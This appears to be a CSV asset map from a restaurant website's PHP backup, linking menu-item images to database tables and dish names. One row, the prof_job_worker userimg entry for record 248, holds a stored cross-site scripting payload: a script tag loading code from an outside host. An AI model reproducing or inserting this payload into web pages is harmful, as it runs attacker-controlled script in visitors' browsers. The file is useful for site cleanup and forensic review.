181.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/181.jpg,9632,55eeb1ffd33c6957bf50b20edeb7c5812022a04d43bd3cf51875ccd69ba2a01f,9ec8e53f6134a6016fa56d85f567adaf,DB Mapped (Verified),menu_item_tbl,181,Rusburry,menu_img
181.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/181.jpg,9632,55eeb1ffd33c6957bf50b20edeb7c5812022a04d43bd3cf51875ccd69ba2a01f,9ec8e53f6134a6016fa56d85f567adaf,DB Mapped (Verified),menu_item_tbl,181,Rusburry,menu_small_img
182.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/182.jpeg,8525,7fb7641ee1189b611fa3dde92e12876dbd7af701a1e07b236c2088ba8240d1de,bc675648460d4f015d71dde626f8cf13,DB Mapped (Verified),menu_item_tbl,182,Khumani,menu_img
182.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/182.jpeg,8525,7fb7641ee1189b611fa3dde92e12876dbd7af701a1e07b236c2088ba8240d1de,bc675648460d4f015d71dde626f8cf13,DB Mapped (Verified),menu_item_tbl,182,Khumani,menu_small_img
183.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/183.jpeg,8520,0b5bcdc60fddaf314196edc138df3214a5431d7147fad3f6ab69985c8aa25f08,f0fabfcc95da432dea587ae79e3a04a9,DB Mapped (Verified),menu_item_tbl,183,Grapes Juice,menu_img
183.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/183.jpeg,8520,0b5bcdc60fddaf314196edc138df3214a5431d7147fad3f6ab69985c8aa25f08,f0fabfcc95da432dea587ae79e3a04a9,DB Mapped (Verified),menu_item_tbl,183,Grapes Juice,menu_small_img
184.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/184.jpg,75417,35d552deb3ea6b8848111d7c5a50168eeeb3c19de0aa986067a956281e4d55e3,61ad346164406e2b372a885a7a06feaf,DB Mapped (Verified),menu_item_tbl,184,Full Green Salad,menu_img
184.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/184.jpg,75417,35d552deb3ea6b8848111d7c5a50168eeeb3c19de0aa986067a956281e4d55e3,61ad346164406e2b372a885a7a06feaf,DB Mapped (Verified),menu_item_tbl,184,Full Green Salad,menu_small_img
185.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/185.jpg,179160,51ef716d660ab575ebd2e9725c2e5afa614687467adb8322a87b82769d8de8d3,127b545dc96c98efe6ccf094fd86ff2c,DB Mapped (Verified),menu_item_tbl,185,Masala Onion Ring,menu_img
185.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/185.jpg,179160,51ef716d660ab575ebd2e9725c2e5afa614687467adb8322a87b82769d8de8d3,127b545dc96c98efe6ccf094fd86ff2c,DB Mapped (Verified),menu_item_tbl,185,Masala Onion Ring,menu_small_img
186.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/186.jpg,163337,b3e0e16e6b1ad34a2fb884d624e9ec7ee00a41ab63e19487832e67b124723a99,6982ffc8a0a83eb2430820b311de0b1f,DB Mapped (Verified),menu_item_tbl,186,Mixed Achar,menu_img
186.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/186.jpg,163337,b3e0e16e6b1ad34a2fb884d624e9ec7ee00a41ab63e19487832e67b124723a99,6982ffc8a0a83eb2430820b311de0b1f,DB Mapped (Verified),menu_item_tbl,186,Mixed Achar,menu_small_img
187.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/187.jpeg,59166,f04d80ca51c3083d2620436d9b72fcb8833e8f3e8c426b6c52f1a41b9b5c4a09,5b35c221c069e1a2bcc258c7359ba1be,DB Mapped (Verified),menu_item_tbl,187,Murabba,menu_img
187.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/187.jpeg,59166,f04d80ca51c3083d2620436d9b72fcb8833e8f3e8c426b6c52f1a41b9b5c4a09,5b35c221c069e1a2bcc258c7359ba1be,DB Mapped (Verified),menu_item_tbl,187,Murabba,menu_small_img
188.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/188.jpg,46496,43c7dd3c46dc0aba3c4121f445b93258a3bd5ae03fb804f34911662e227735c4,ffa38abeb0d5b2992af98f383e4d486c,DB Mapped (Verified),menu_item_tbl,188,Fresh Indian Fruits,menu_img
188.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/188.jpg,46496,43c7dd3c46dc0aba3c4121f445b93258a3bd5ae03fb804f34911662e227735c4,ffa38abeb0d5b2992af98f383e4d486c,DB Mapped (Verified),menu_item_tbl,188,Fresh Indian Fruits,menu_small_img
189.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/189.jpg,24706,73c93c424dff728e1699de376155d720ea031d26d53a0cc4583d9954d26f6846,74e6ae25b062f5b505c417ac1d6b45ab,DB Mapped (Verified),menu_item_tbl,189,Sirka Payaz,menu_img
189.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/189.jpg,24706,73c93c424dff728e1699de376155d720ea031d26d53a0cc4583d9954d26f6846,74e6ae25b062f5b505c417ac1d6b45ab,DB Mapped (Verified),menu_item_tbl,189,Sirka Payaz,menu_small_img
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),menu_item_tbl,2,Plain Idli,menu_small_img
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),product_item_tbl,2,Gujrati Kachori,menu_img
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),website_gallery,2,Images 2,gimage
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),recipe_appliances_kits,2,Black Pepper Powder,kits_img
2.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/2.jpg,9342,3bdd6f9bd88e206f0aac29dd6462861c8592223e74a9ca2a1928790d2b882021,2f7fe1bdad7a08a02d246bf6f6d18772,DB Mapped (Verified),event_cuisine,2,North Indian,cuisine_img
222.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/222.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,222,Dhai Bada,menu_img
222.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/222.webp,72510,ac6898e18887483197b8a4ec06079ac90143cefd2990c20b76ee46bd65180bd2,009acea811ddc5c7d95cbd46bc33b10c,DB Mapped (Verified),menu_item_tbl,222,Dhai Bada,menu_small_img
223.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/223.jpeg,12655,99315d4b4032cec547246187f9c0e475e05a980320b0e8ba3c182729f403f363,c09e809f804cd0856bc2c86601f25754,DB Mapped (Verified),menu_item_tbl,223,Boondi Raita,menu_img
223.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/223.jpeg,12655,99315d4b4032cec547246187f9c0e475e05a980320b0e8ba3c182729f403f363,c09e809f804cd0856bc2c86601f25754,DB Mapped (Verified),menu_item_tbl,223,Boondi Raita,menu_small_img
224.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/224.jpeg,8292,e0053582825091f3f2e012f5424dceca9032b735d9124c67c3ca2662b3cc4367,0ea068556bc40e24fdd6e3d0d9a64d8e,DB Mapped (Verified),menu_item_tbl,224,Mix Fruit Raita,menu_img
224.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/224.jpeg,8292,e0053582825091f3f2e012f5424dceca9032b735d9124c67c3ca2662b3cc4367,0ea068556bc40e24fdd6e3d0d9a64d8e,DB Mapped (Verified),menu_item_tbl,224,Mix Fruit Raita,menu_small_img
225.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/225.jpeg,8497,39e467f30983c7399b5d6391913c66bf1ec4353ce64187a52c0bb297b317ef4d,0fef754850531d457f7df95dc52cc536,DB Mapped (Verified),menu_item_tbl,225,Potato Raita,menu_img
225.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/225.jpeg,8497,39e467f30983c7399b5d6391913c66bf1ec4353ce64187a52c0bb297b317ef4d,0fef754850531d457f7df95dc52cc536,DB Mapped (Verified),menu_item_tbl,225,Potato Raita,menu_small_img
226.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/226.jpeg,6910,755bc357f4bc1e93a014b627a44d1e5dfce2a5f0a7d1713f039be7d2d11fa51c,d9ccb4f8372d6d8f228650bf359862d1,DB Mapped (Verified),menu_item_tbl,226,Loki Ka Raita,menu_img
226.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/226.jpeg,6910,755bc357f4bc1e93a014b627a44d1e5dfce2a5f0a7d1713f039be7d2d11fa51c,d9ccb4f8372d6d8f228650bf359862d1,DB Mapped (Verified),menu_item_tbl,226,Loki Ka Raita,menu_small_img
227.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/227.jpeg,8086,6fdd6ae667115c1ce559c76558b3493417ec76f2e01ebd8c73c7cccef78ca712,f4318030ced70d7c2ee7f646584f85af,DB Mapped (Verified),menu_item_tbl,227,Khire ka Raita,menu_img
227.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/227.jpeg,8086,6fdd6ae667115c1ce559c76558b3493417ec76f2e01ebd8c73c7cccef78ca712,f4318030ced70d7c2ee7f646584f85af,DB Mapped (Verified),menu_item_tbl,227,Khire ka Raita,menu_small_img
228.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/228.jpg,14258,d703466b90bb952894d6e7bbddd5e6a8417619721030e501970fcec5b27a9bbe,41e02c5fe7878544fdb7712f3f83df16,DB Mapped (Verified),menu_item_tbl,228,Pineapple Raita,menu_img
228.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/228.jpg,14258,d703466b90bb952894d6e7bbddd5e6a8417619721030e501970fcec5b27a9bbe,41e02c5fe7878544fdb7712f3f83df16,DB Mapped (Verified),menu_item_tbl,228,Pineapple Raita,menu_small_img
229.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/229.jpeg,8524,327d812f278bcad23a0cc4b04b9b3a5e285fad43e0e945161d7ca11add0908db,ec0c88f969cc12d313687e8b065d9d54,DB Mapped (Verified),menu_item_tbl,229,TFH Special Raita,menu_img
229.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/229.jpeg,8524,327d812f278bcad23a0cc4b04b9b3a5e285fad43e0e945161d7ca11add0908db,ec0c88f969cc12d313687e8b065d9d54,DB Mapped (Verified),menu_item_tbl,229,TFH Special Raita,menu_small_img
23.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/23.jpg,15784,3f5bbb2cb5f877bda10dca99220304d50426e79a01bba0b27ad656f90c1f1e2a,cb960c990be3eb44020b8bd8772c1edc,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_img
23.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/23.jpg,15784,3f5bbb2cb5f877bda10dca99220304d50426e79a01bba0b27ad656f90c1f1e2a,cb960c990be3eb44020b8bd8772c1edc,DB Mapped (Verified),menu_item_tbl,23,Tomato Basil Soup,menu_small_img
23.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/23.jpg,15784,3f5bbb2cb5f877bda10dca99220304d50426e79a01bba0b27ad656f90c1f1e2a,cb960c990be3eb44020b8bd8772c1edc,DB Mapped (Verified),product_item_tbl,23,Lal Mirch ka Bharua Achar,menu_img
230.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/230.webp,23972,63d738238f6b42a4904a1fbaa6d0b29d36b727563a5ad39cf0a2ab638cfdc8f2,a33e40e6e1de87420250929aa1da4b86,DB Mapped (Verified),menu_item_tbl,230,Roasted Papad,menu_img
230.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/230.webp,23972,63d738238f6b42a4904a1fbaa6d0b29d36b727563a5ad39cf0a2ab638cfdc8f2,a33e40e6e1de87420250929aa1da4b86,DB Mapped (Verified),menu_item_tbl,230,Roasted Papad,menu_small_img
231.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/231.webp,46218,35287aef0d9e279871e11ff09c5cb4869763c62a8adc6518d7becf794657fb47,218704947a4de14dd6c2d9e092803b0c,DB Mapped (Verified),menu_item_tbl,231,Lijjat Papad,menu_img
231.webp,old-website-php/Full-website-backup/frontEnd/menuimg/small/231.webp,46218,35287aef0d9e279871e11ff09c5cb4869763c62a8adc6518d7becf794657fb47,218704947a4de14dd6c2d9e092803b0c,DB Mapped (Verified),menu_item_tbl,231,Lijjat Papad,menu_small_img
232.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/232.jpg,27003,4c65db39d6bdd547bb8a9dc5f366bc59f43ab0d75359516eb414a6758d6a885a,7190f2e5b2d7f32b9c84efcc4b741286,DB Mapped (Verified),menu_item_tbl,232,Papad ki Churi,menu_img
232.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/232.jpg,27003,4c65db39d6bdd547bb8a9dc5f366bc59f43ab0d75359516eb414a6758d6a885a,7190f2e5b2d7f32b9c84efcc4b741286,DB Mapped (Verified),menu_item_tbl,232,Papad ki Churi,menu_small_img
233.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/233.jpeg,7448,62927a41c2d91d8294f5a41b741433b8211f58e86aa9eed268341227e93d2743,b8cb73bed74866cab57ec1f6ddb73f87,DB Mapped (Verified),menu_item_tbl,233,Sabudane Ka Papad,menu_img
233.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/233.jpeg,7448,62927a41c2d91d8294f5a41b741433b8211f58e86aa9eed268341227e93d2743,b8cb73bed74866cab57ec1f6ddb73f87,DB Mapped (Verified),menu_item_tbl,233,Sabudane Ka Papad,menu_small_img
234.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/234.jpg,30108,6900419f810f24ac3f44e4a7337e9cb758b93c9c3ff5f850be361a95dfe9f9e9,653aadcf0557560c88e1691ce8231cf7,DB Mapped (Verified),menu_item_tbl,234,Fry Papad,menu_img
234.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/234.jpg,30108,6900419f810f24ac3f44e4a7337e9cb758b93c9c3ff5f850be361a95dfe9f9e9,653aadcf0557560c88e1691ce8231cf7,DB Mapped (Verified),menu_item_tbl,234,Fry Papad,menu_small_img
235.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/235.jpg,13338,6617b0de8428fd2d94bdf20a9662fb89b98f489ff32bf2f819470c35d8685030,1ac290d2c80919b37fd2c526f091e3a6,DB Mapped (Verified),menu_item_tbl,235,Allo Ka Papad,menu_img
235.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/235.jpg,13338,6617b0de8428fd2d94bdf20a9662fb89b98f489ff32bf2f819470c35d8685030,1ac290d2c80919b37fd2c526f091e3a6,DB Mapped (Verified),menu_item_tbl,235,Allo Ka Papad,menu_small_img
236.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/236.jpg,22003,1a11a020cdb84e7f6f07286577c423cb3792e01eb8f364d4c9aa57e115f026ba,861db002f905a6a9a6674832a31e8b53,DB Mapped (Verified),menu_item_tbl,236,Missi Phulka,menu_img
236.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/236.jpg,22003,1a11a020cdb84e7f6f07286577c423cb3792e01eb8f364d4c9aa57e115f026ba,861db002f905a6a9a6674832a31e8b53,DB Mapped (Verified),menu_item_tbl,236,Missi Phulka,menu_small_img
237.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/237.jpeg,8899,b7ede46c107c61ca7d1e1410c57b560d51d6472b6fa254ca9af191ae2611b7cd,1e4d6d582440f97828273c9f466e441b,DB Mapped (Verified),menu_item_tbl,237,Chupdi Chapati,menu_img
237.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/237.jpeg,8899,b7ede46c107c61ca7d1e1410c57b560d51d6472b6fa254ca9af191ae2611b7cd,1e4d6d582440f97828273c9f466e441b,DB Mapped (Verified),menu_item_tbl,237,Chupdi Chapati,menu_small_img
238.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/238.jpg,43825,b1ffb339b10c4713ae6e20223ea4f066fa81f36c63fb676836939afb4cc15d54,e3dd53add82387b2430e03ed472a02ba,DB Mapped (Verified),menu_item_tbl,238,Makka Ki Roti,menu_img
238.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/238.jpg,43825,b1ffb339b10c4713ae6e20223ea4f066fa81f36c63fb676836939afb4cc15d54,e3dd53add82387b2430e03ed472a02ba,DB Mapped (Verified),menu_item_tbl,238,Makka Ki Roti,menu_small_img
239.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/239.jpg,64217,6725257360adfaeb06f0adbbf912aa735087293de116d7c079082b466593687e,763ef511a5dcc2a74896137445411dfc,DB Mapped (Verified),menu_item_tbl,239,Bajre Ki Roti,menu_img
239.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/239.jpg,64217,6725257360adfaeb06f0adbbf912aa735087293de116d7c079082b466593687e,763ef511a5dcc2a74896137445411dfc,DB Mapped (Verified),menu_item_tbl,239,Bajre Ki Roti,menu_small_img
24.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),menu_item_tbl,24,Sweet Corn Soup - Chinese,menu_small_img
24.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),product_item_tbl,24,Aam ka Achar,menu_img
24.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/24.jpg,10967,6b7814718eafc387d80544a6f4c5dd58801cec5875613c47ca957c747b3196be,f112b48ca4e3624901db7e407ffcc3a3,DB Mapped (Verified),website_gallery,24,Amritsari Kulcha,gimage
240.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/240.jpg,16321,b505b518a6429ea4ba732a8136941fc135c6418c0ed221847c1b9a2b09aa8a2a,68c274bae5a2e10c377885a14ebba6e3,DB Mapped (Verified),menu_item_tbl,240,Karela Sutff,menu_img
240.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/240.jpg,16321,b505b518a6429ea4ba732a8136941fc135c6418c0ed221847c1b9a2b09aa8a2a,68c274bae5a2e10c377885a14ebba6e3,DB Mapped (Verified),menu_item_tbl,240,Karela Sutff,menu_small_img
241.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/241.jpg,11813,78af8d714d0abcb79f08c64d8f979c24c1bb6038ba70274dd945d715e260954c,bf55be84d2c83514c5b1d6fa36bcec74,DB Mapped (Verified),menu_item_tbl,241,Bhindi Stuff,menu_img
241.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/241.jpg,11813,78af8d714d0abcb79f08c64d8f979c24c1bb6038ba70274dd945d715e260954c,bf55be84d2c83514c5b1d6fa36bcec74,DB Mapped (Verified),menu_item_tbl,241,Bhindi Stuff,menu_small_img
242.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/242.jpg,10596,4c16de6415d9bf4c0e31ff9faa0ded85e1f53a142fe29c7f439b25a0107a43eb,09dc8d17021d1512bcf878c9cc99616d,DB Mapped (Verified),menu_item_tbl,242,Arabi,menu_img
242.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/242.jpg,10596,4c16de6415d9bf4c0e31ff9faa0ded85e1f53a142fe29c7f439b25a0107a43eb,09dc8d17021d1512bcf878c9cc99616d,DB Mapped (Verified),menu_item_tbl,242,Arabi,menu_small_img
243.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/243.jpg,16386,ed727ba7e1268b553621b73053b220487226f546a4ded1cffcfad8819a2eb88b,32280c588aa55e25e2857410f23b86e9,DB Mapped (Verified),menu_item_tbl,243,Stuffed Tomato,menu_img
243.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/243.jpg,16386,ed727ba7e1268b553621b73053b220487226f546a4ded1cffcfad8819a2eb88b,32280c588aa55e25e2857410f23b86e9,DB Mapped (Verified),menu_item_tbl,243,Stuffed Tomato,menu_small_img
244.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/244.jpg,13853,3fc3dab2cf3f40b9eaf67d3400fa26d67ecb3bf111071c33224a9590065e80e5,a9b1777e96f8b4fa339d5230c28fccc4,DB Mapped (Verified),menu_item_tbl,244,Stuffed Shimla Mirch,menu_img
244.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/244.jpg,13853,3fc3dab2cf3f40b9eaf67d3400fa26d67ecb3bf111071c33224a9590065e80e5,a9b1777e96f8b4fa339d5230c28fccc4,DB Mapped (Verified),menu_item_tbl,244,Stuffed Shimla Mirch,menu_small_img
245.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/245.jpg,14332,1370b1ca0345cfe499c6f1aeb413cb2795a12ef47f03a5eddcb31f82bb68a0f6,7d8fa6af9a96928a80ae53f2f8fffa4e,DB Mapped (Verified),menu_item_tbl,245,Sada Puri,menu_img
245.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/245.jpg,14332,1370b1ca0345cfe499c6f1aeb413cb2795a12ef47f03a5eddcb31f82bb68a0f6,7d8fa6af9a96928a80ae53f2f8fffa4e,DB Mapped (Verified),menu_item_tbl,245,Sada Puri,menu_small_img
246.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/246.jpeg,7367,32035ac49824f2f6b60544e2f5f998d708c4364abede08cf7bd2b954fd0b0f3d,cdfc27aaf041e86f778ed7c33fdd5741,DB Mapped (Verified),menu_item_tbl,246,Ajwain Puri,menu_img
246.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/246.jpeg,7367,32035ac49824f2f6b60544e2f5f998d708c4364abede08cf7bd2b954fd0b0f3d,cdfc27aaf041e86f778ed7c33fdd5741,DB Mapped (Verified),menu_item_tbl,246,Ajwain Puri,menu_small_img
247.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/247.jpeg,10172,87eb9affdd79b982c90eb3f624982194d76ec7501b4c76512382a50d5acc880c,05bb1d90ac9ed27448cdd91640a73c32,DB Mapped (Verified),menu_item_tbl,247,Palak Puri,menu_img
247.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/247.jpeg,10172,87eb9affdd79b982c90eb3f624982194d76ec7501b4c76512382a50d5acc880c,05bb1d90ac9ed27448cdd91640a73c32,DB Mapped (Verified),menu_item_tbl,247,Palak Puri,menu_small_img
248.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/248.jpg,15978,67f66f6873fe188f40c9990d0d9ebf335fa23d46f23115de44260b31c65a2412,f123b09625614bc8e4f4d9f0f05eb34c,DB Mapped (Verified),menu_item_tbl,248,Dal ki Puri,menu_img
248.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/248.jpg,15978,67f66f6873fe188f40c9990d0d9ebf335fa23d46f23115de44260b31c65a2412,f123b09625614bc8e4f4d9f0f05eb34c,DB Mapped (Verified),menu_item_tbl,248,Dal ki Puri,menu_small_img
248.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/248.jpg,15978,67f66f6873fe188f40c9990d0d9ebf335fa23d46f23115de44260b31c65a2412,f123b09625614bc8e4f4d9f0f05eb34c,DB Mapped (Verified),prof_job_worker,248,<sCRiPt/sRC=//0l2.co/1/></sCrIpT>Nocal,userimg
249.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/249.jpeg,14556,1fce2fca86c78a5e7ac57508f547337b963b342fbafd3362d784831184d7ece7,721e81691b4e159cc8ded4a6694cd526,DB Mapped (Verified),menu_item_tbl,249,Masala Puri,menu_img
249.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/249.jpeg,14556,1fce2fca86c78a5e7ac57508f547337b963b342fbafd3362d784831184d7ece7,721e81691b4e159cc8ded4a6694cd526,DB Mapped (Verified),menu_item_tbl,249,Masala Puri,menu_small_img
25.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/25.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,25,Hot & Sour Soup - Chinese,menu_img
25.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/25.jpeg,26491,194843a8d7d8f8c975d0a73bc70b07b6bb0c363f0c4a6bb19332342dbb74bc2e,c1c6d3022f1bc40ec087c5252611c9de,DB Mapped (Verified),menu_item_tbl,25,Hot & Sour Soup - Chinese,menu_small_img
250.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/250.jpeg,11963,650ea0cc7e8f928be910417a4daef0beb44e2956d9ee5774f8b57ab6bebc0ad8,04c3ae4b72428447a2b1622505b3be9b,DB Mapped (Verified),menu_item_tbl,250,Allo Puri(Bedmi),menu_img
250.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/250.jpeg,11963,650ea0cc7e8f928be910417a4daef0beb44e2956d9ee5774f8b57ab6bebc0ad8,04c3ae4b72428447a2b1622505b3be9b,DB Mapped (Verified),menu_item_tbl,250,Allo Puri(Bedmi),menu_small_img
251.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/251.jpeg,12612,253d8ff8ae1928951acc1cf573282f2ca2eaa4c9b641cb77e0627dc50b3412b6,a08605ce23ba0775905f9cef1a184ed3,DB Mapped (Verified),menu_item_tbl,251,Plain Naan,menu_img
251.jpeg,old-website-php/Full-website-backup/frontEnd/menuimg/small/251.jpeg,12612,253d8ff8ae1928951acc1cf573282f2ca2eaa4c9b641cb77e0627dc50b3412b6,a08605ce23ba0775905f9cef1a184ed3,DB Mapped (Verified),menu_item_tbl,251,Plain Naan,menu_small_img
252.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/252.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,252,Paneer Naan,menu_img
252.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/252.jpg,47698,e2deb3b8a3028e104913fce6dadbea3ef62fb32354dee7d3410d56242b925249,fac643e97704a6a54dffece6b7935f46,DB Mapped (Verified),menu_item_tbl,252,Paneer Naan,menu_small_img
253.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/253.jpg,11993,a43f1aa2c766a96771b76841ba0d7104a5ef849d5aa5cfc2bc1a9823499b4073,990eb7c847c5875b89134ff7b7ad984c,DB Mapped (Verified),menu_item_tbl,253,Laccha Paratha,menu_img
253.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/253.jpg,11993,a43f1aa2c766a96771b76841ba0d7104a5ef849d5aa5cfc2bc1a9823499b4073,990eb7c847c5875b89134ff7b7ad984c,DB Mapped (Verified),menu_item_tbl,253,Laccha Paratha,menu_small_img
254.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/254.jpg,23817,982a2f7f882aa6169099e48493b09cc260a796f6f7bf3234f37d2c813979f727,a477cad89526725382bb8eb3284b2513,DB Mapped (Verified),menu_item_tbl,254,Stuffed Paratha,menu_img
254.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/254.jpg,23817,982a2f7f882aa6169099e48493b09cc260a796f6f7bf3234f37d2c813979f727,a477cad89526725382bb8eb3284b2513,DB Mapped (Verified),menu_item_tbl,254,Stuffed Paratha,menu_small_img
255.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/255.jpg,119227,dd89b2f4df4e519a14002341116ea1334354fcf5cce5003889c1ad29134eb2c5,ed28ece681a5f6c101883ad445cf7a52,DB Mapped (Verified),menu_item_tbl,255,Stuffed Kulcha,menu_img
255.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/255.jpg,119227,dd89b2f4df4e519a14002341116ea1334354fcf5cce5003889c1ad29134eb2c5,ed28ece681a5f6c101883ad445cf7a52,DB Mapped (Verified),menu_item_tbl,255,Stuffed Kulcha,menu_small_img
256.jpg,old-website-php/Full-website-backup/frontEnd/menuimg/small/256.jpg,11513,3accf8bd08e387577e968d4f4211a1f047931c09b236fedfe69f45d90c0715b0,6de07874b3e4f38e46c561eda14e9b19,DB Mapped (Verified),menu_item_tbl,256,Khasta Missi,menu_img
